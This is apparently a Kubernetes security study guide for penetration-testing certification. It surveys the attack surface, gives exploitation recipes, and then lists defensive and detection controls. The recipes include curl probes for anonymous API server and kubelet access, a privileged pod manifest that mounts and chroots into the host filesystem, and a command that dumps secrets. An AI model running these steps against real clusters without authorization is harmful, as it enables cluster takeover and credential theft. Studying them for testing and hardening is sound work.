# Kubernetes Security

This file covers the security of Kubernetes, the dominant container orchestration platform. It focuses on the Kubernetes-specific attack surface: the API server, kubelet, RBAC, network policies, and pod security. The offensive techniques target misconfigurations and privilege escalation paths within the cluster.

## 1. Overview

Kubernetes orchestrates containers across a cluster of nodes. Its security model relies on:

- **API Server** - the central control plane component. All requests go through it.
- **etcd** - the key-value store that holds cluster state.
- **kubelet** - the node agent that manages pods.
- **RBAC** - Role-Based Access Control.
- **Network Policies** - control traffic between pods.
- **Pod Security** - admission control for pod specifications.

A misconfigured Kubernetes cluster can allow an attacker to escalate from a single compromised pod to full cluster admin.

## 2. Kubernetes Attack Surface

### 2.1 API Server

The API server is the most critical component. Common vulnerabilities:

- Unauthenticated access (if anonymous auth is enabled).
- Weak RBAC (overly permissive roles).
- Exposed dashboard (Kubernetes Dashboard).
- Insecure endpoints (e.g., `/metrics`, `/healthz`).

### 2.2 Kubelet

The kubelet runs on every node. If the kubelet API is exposed without authentication, an attacker can execute commands in any pod on that node.

- Default ports: 10250 (HTTPS), 10255 (HTTP, read-only).
- Misconfiguration: `--anonymous-auth=true`.

### 2.3 etcd

etcd stores all cluster secrets. If exposed, an attacker can read all secrets and modify cluster state.

- Default port: 2379.
- Misconfiguration: no client certificate authentication.

### 2.4 Pod Security

Pods can be configured with dangerous settings:

- `privileged: true`.
- `hostNetwork: true`.
- `hostPID: true`.
- `hostPath` volumes mounting the host filesystem.
- `capabilities: add: ["SYS_ADMIN"]`.

### 2.5 RBAC

Overly permissive RBAC roles allow privilege escalation:

- `cluster-admin` bound to a service account.
- `create pods` permission allowing pod creation with host mounts.
- `get secrets` permission allowing secret theft.

## 3. Exploitation Recipes

### 3.1 Checking for Anonymous Access

```bash
# Check if the API server allows anonymous access.
$ curl -k https://<api-server>:6443/api/v1/namespaces/default/pods
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Expected output:

```text
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": { ... },
  "items": [ ... ]
}
```

### 3.2 Checking Kubelet Access

```bash
# Check if the kubelet API is exposed.
$ curl -k https://<node-ip>:10250/pods
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Expected output:

```text
{
  "kind": "PodList",
  "apiVersion": "v1",
  ...
}
```

### 3.3 Creating a Privileged Pod

If you have `create pods` permission, you can create a pod that mounts the host filesystem:

```bash
$ cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "chroot /host /bin/bash"]
    volumeMounts:
    - name: host
      mountPath: /host
    securityContext:
      privileged: true
  volumes:
  - name: host
    hostPath:
      path: /
EOF
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Expected output:

```text
pod/escape created
```

### 3.4 Stealing Secrets

If you have `get secrets` permission, you can read all secrets in a namespace:

```bash
$ kubectl get secrets -o yaml
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Expected output:

```text
apiVersion: v1
items:
- apiVersion: v1
  data:
    password: <base64-encoded>
  kind: Secret
  metadata:
    name: db-password
```

## 4. Defensive Controls

- **Enable RBAC** and follow the principle of least privilege.
- **Disable anonymous authentication** on the API server and kubelet.
- **Use network policies** to restrict pod-to-pod traffic.
- **Enforce Pod Security Standards** (Restricted profile).
- **Protect etcd** with client certificate authentication and network isolation.
- **Audit API server logs** for suspicious activity.
- **Regularly review RBAC bindings**.

## 5. Detection Controls

- **Audit logs** capture all API requests. Monitor for unusual `create pods` or `get secrets` calls.
- **Runtime security** (Falco) detects privileged pod creation.
- **Network monitoring** detects unauthorized communication with the API server or kubelet.
- **Integrity monitoring** for etcd data.

## 6. Verification

To verify cluster security:

- Check that anonymous auth is disabled: `kubectl auth can-i --list`.
- Check RBAC bindings: `kubectl get clusterrolebindings -o wide`.
- Check pod security policies: `kubectl get psp` (if using PSP) or Pod Security Admission.
- Check network policies: `kubectl get networkpolicies --all-namespaces`.

## 7. Production Notes

- Use a managed Kubernetes service (EKS, GKE, AKS) with built-in security controls.
- Regularly update Kubernetes to the latest patch version.
- Use a service mesh (Istio, Linkerd) for mTLS between pods.
- Monitor the cluster for drift from the security baseline.

## 8. References

- Kubernetes Security Documentation - https://kubernetes.io/docs/concepts/security/
- CIS Kubernetes Benchmark - https://www.cisecurity.org/benchmark/kubernetes
- NIST SP 800-190 Application Container Security Guide - https://csrc.nist.gov/publications/detail/sp/800-190/final
- Kubernetes Pod Security Standards - https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Falco runtime security - https://falco.org/
- OWASP Kubernetes Top 10 - https://owasp.org/www-project-kubernetes-top-ten/